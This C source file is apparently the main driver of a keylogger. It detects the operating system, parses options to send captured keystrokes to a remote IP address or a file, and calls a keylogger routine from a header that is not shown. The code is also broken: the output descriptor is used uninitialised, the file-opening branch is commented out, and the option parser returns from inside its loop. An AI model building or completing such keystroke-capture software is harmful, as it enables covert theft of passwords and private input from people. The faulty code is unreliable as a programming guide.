//
// Created by mallo on 13/12/2022.
//

/**
 * Determination a platform of an operation system
 * Fully supported supported only GNU GCC/G++, partially on Clang/LLVM
 */

#if defined(_WIN32)
#define PLATFORM_WINDOWS "windows" // Windows
    #define PLATFORM_NAME "windows"
#elif defined(_WIN64)
#define PLATFORM_WINDOWS "windows" // Windows
    #define PLATFORM_NAME "windows"
#elif defined(__CYGWIN__) && !defined(_WIN32)
#define PLATFORM_WINDOWS "windows" // Windows (Cygwin POSIX under Microsoft Window)
    #define PLATFORM_NAME "windows"
#elif defined(__ANDROID__)
#define PLATFORM_ANDROID "android" // Android (implies Linux, so it must come first)
    #define PLATFORM_NAME "android"
#elif defined(__linux__)
#define PLATFORM_LINUX "linux" // Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other
    #define PLATFORM_NAME "linux"
#elif defined(__unix__) || !defined(__APPLE__) && defined(__MACH__)
#include <sys/param.h>
    #if defined(BSD)
        #define PLATFORM_BSD "bsd" // FreeBSD, NetBSD, OpenBSD, DragonFly BSD
        #define PLATFORM_NAME "bsd"
    #endif
#elif defined(__hpux)
#define PLATFORM_HP_UX "hp-ux" // HP-UX
    #define PLATFORM_NAME "hp-ux"
#elif defined(_AIX)
#define PLATFORM_AIX "aix" // IBM AIX
    #define PLATFORM_NAME "aix"
#elif defined(__APPLE__) && defined(__MACH__) // Apple OSX and iOS (Darwin)
#include <TargetConditionals.h>
    #if TARGET_IPHONE_SIMULATOR == 1
        #define PLATFORM_IOS "ios" // Apple iOS
        #define PLATFORM_NAME "ios"
    #elif TARGET_OS_IPHONE == 1
        #define PLATFORM_IOS "ios" // Apple iOS
        #define PLATFORM_NAME "ios"
    #elif TARGET_OS_MAC == 1
        #define PLATFORM_OSX "osx" // Apple OSX
        #define PLATFORM_NAME "osx"
    #endif
#elif defined(__sun) && defined(__SVR4)
#define PLATFORM_SOLARIS "solaris" // Oracle Solaris, Open Indiana
    #define PLATFORM_NAME "solaris"
#else
#define PLATFORM_NULL NULL
#define PLATFORM_NAME NULL
#endif

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include "keylogger.h"

const char *get_platform_name();
void print_usage_and_quit(char *application_name);
const char *parse_options(int argc, char *argv[]);

// flag checker for command line option
int network = 0, file = 0;

int main(int argc, char *argv[]) {
    // prints platform
    puts(get_platform_name());

    // output file descriptor
    int writeout;

    // option value
    const char *option_input = parse_options(argc, argv);

    // both or neither options are given, not permitted
    if(network == file){
        print_usage_and_quit(argv[0]);
    }
    /*
    else if(file) {
        if((writeout = open(option_input, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0){
            printf("Error opening file %s: %s\n", argv[2], strerror(errno));
            return 1;
        }
    }
    */

    keylogger(writeout);
    //close(writeout);

}

const char *get_platform_name() {
    return (PLATFORM_NAME == NULL) ? "" : PLATFORM_NAME;
}

const char *parse_options(int argc, char *argv[]) {
    int option = 0;

    // parse command line options until option == -1 (no more options)
    // then returns the value of the option
    while((option = getopt(argc, argv,"sn:f:")) != -1){
        switch(option){
            case 'n':
                network = 1;
                break;
            case 'f':
                file = 1;
                break;
            default: print_usage_and_quit(argv[0]);
        }
        return optarg;
    }
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-n ip-address | -f output-file]\n", application_name);
    exit(1);
}

